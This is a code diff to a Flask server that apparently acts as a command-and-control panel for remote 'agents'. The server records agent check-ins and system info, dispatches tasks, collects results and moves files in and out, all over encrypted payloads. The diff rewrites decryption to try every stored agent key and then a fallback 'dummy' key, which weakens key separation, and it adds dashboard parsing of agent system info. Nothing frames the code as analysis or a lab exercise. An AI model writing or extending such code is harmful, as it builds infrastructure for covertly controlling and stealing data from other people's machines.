@@ -13,6 +13,7 @@ import json
 import base64
 import sqlite3
 import logging
+import uuid
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template
 from cryptography.fernet import Fernet
@@ -80,13 +81,27 @@ def encrypt_data(data, agent_id):
         logger.error(f"Encryption error for agent {agent_id}: {e}")
         return json.dumps(data)
 
-def decrypt_data(encrypted_data, agent_id):
-    """Decrypt data using AES"""
+def decrypt_data(encrypted_data):
+    """Decrypt data by trying all known agent_ids"""
+    with sqlite3.connect(DB_PATH) as conn:
+        c = conn.cursor()
+        c.execute('SELECT agent_id FROM agents')
+        agent_ids = [row[0] for row in c.fetchall()]
+
+    # Try all known agent_ids
+    for aid in agent_ids:
+        try:
+            cipher = Fernet(generate_encryption_key(aid))
+            return json.loads(cipher.decrypt(encrypted_data.encode()).decode())
+        except Exception:
+            continue
+
+    # If no match, try to decrypt with a dummy key (for first-time agents, may fail)
     try:
-        cipher = Fernet(generate_encryption_key(agent_id))
+        cipher = Fernet(generate_encryption_key("dummy"))
         return json.loads(cipher.decrypt(encrypted_data.encode()).decode())
     except Exception as e:
-        logger.error(f"Decryption error for agent {agent_id}: {e}")
+        logger.error(f"Decryption failed for all keys: {e}")
         return {}
 
 @app.route('/')
@@ -95,9 +110,19 @@ def index():
     with sqlite3.connect(DB_PATH) as conn:
         c = conn.cursor()
         c.execute('SELECT agent_id, system_info, last_checkin FROM agents')
-        agents = c.fetchall()
+        agents_data = c.fetchall()
         c.execute('SELECT task_id, agent_id, task_type, task_data, status, result, timestamp FROM tasks ORDER BY timestamp DESC')
         tasks = c.fetchall()
+
+    # Parse JSON system_info before sending to template
+    agents = []
+    for agent in agents_data:
+        try:
+            info = json.loads(agent[1]) if agent[1] else {}
+        except json.JSONDecodeError:
+            info = {}
+        agents.append((agent[0], info, agent[2]))
+
     return render_template('index.html', agents=agents, tasks=tasks)
 
 @app.route('/api/checkin', methods=['POST'])
@@ -108,8 +133,8 @@ def checkin():
         if not data:
             return jsonify({'error': 'No data provided'}), 400
         
-        # Decrypt data
-        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        # Decrypt data (agent_id will be inside decrypted payload)
+        decrypted_data = decrypt_data(data)
         agent_id = decrypted_data.get('agent_id')
         if not agent_id:
             return jsonify({'error': 'Invalid agent_id'}), 400
@@ -155,7 +180,7 @@ def receive_results():
         if not data:
             return jsonify({'error': 'No data provided'}), 400
         
-        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        decrypted_data = decrypt_data(data)
         task_id = decrypted_data.get('task_id')
         agent_id = decrypted_data.get('agent_id')
         result = decrypted_data.get('result')
@@ -183,7 +208,7 @@ def upload_file():
         if not data:
             return jsonify({'error': 'No data provided'}), 400
         
-        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        decrypted_data = decrypt_data(data)
         agent_id = decrypted_data.get('agent_id')
         filename = decrypted_data.get('filename')
         content = decrypted_data.get('content')
@@ -211,7 +236,7 @@ def download_file():
         if not data:
             return jsonify({'error': 'No data provided'}), 400
         
-        decrypted_data = decrypt_data(data, request.json.get('agent_id', 'unknown'))
+        decrypted_data = decrypt_data(data)
         agent_id = decrypted_data.get('agent_id')
         file_path = decrypted_data.get('path')
         
